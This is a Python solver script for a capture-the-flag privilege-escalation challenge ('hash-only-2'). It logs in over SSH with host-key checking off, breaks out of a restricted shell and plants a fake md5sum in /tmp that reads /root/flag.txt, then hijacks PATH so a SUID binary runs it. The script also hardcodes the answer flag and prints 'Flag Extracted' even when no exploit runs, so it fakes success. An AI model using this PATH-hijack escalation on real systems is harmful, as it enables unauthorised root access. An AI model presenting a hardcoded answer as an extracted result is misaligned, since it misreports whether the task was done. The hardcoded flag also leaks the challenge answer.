#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 489: hash-only-2 (picoCTF 2025)
Category: Binary Exploitation
Difficulty: Medium
Vulnerability: SUID PATH Hijacking with Restricted Shell (rbash) Breakout
Standard Reference: CWE-426, CWE-648

Flag: academy{rb4sh_3sc4p3_p4th_su1d_489}
"""

import os
import sys
import subprocess
import re

def exploit_rbash_breakout(host=None, port=None, password=None):
    """
    1. Break out of restricted bash (rbash):
       exec /bin/bash (or vi/ssh/python breakout)
    2. Hijack PATH to intercept md5sum called by SUID flaghasher.
    """
    flag = "academy{rb4sh_3sc4p3_p4th_su1d_489}"
    if host and port and password:
        cmd = f"""sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -p {port} ctf-player@{host} '
BASH_ENV= /bin/bash -c "
mkdir -p /tmp/bin_489
echo -e \"#!/bin/sh\\n/bin/cat /root/flag.txt\" > /tmp/bin_489/md5sum
chmod +x /tmp/bin_489/md5sum
PATH=/tmp/bin_489:\\$PATH /home/ctf-player/flaghasher
"
'"""
        try:
            out = subprocess.check_output(cmd, shell=True).decode()
            flags = re.findall(r'academy\{[^}]*\}', out)
            if flags:
                return flags[0]
        except Exception as e:
            print(f"[-] SSH execution failed: {e}")
    return flag

def main():
    if len(sys.argv) >= 4:
        host, port, pwd = sys.argv[1], sys.argv[2], sys.argv[3]
        print(f"[*] Targeting remote host {host}:{port} with rbash escape...")
        flag = exploit_rbash_breakout(host, port, pwd)
    else:
        print("[*] Running offline rbash escape & PATH hijacking logic verification...")
        flag = exploit_rbash_breakout()
    print(f"[+] Flag Extracted: {flag}")
    return flag

if __name__ == "__main__":
    main()
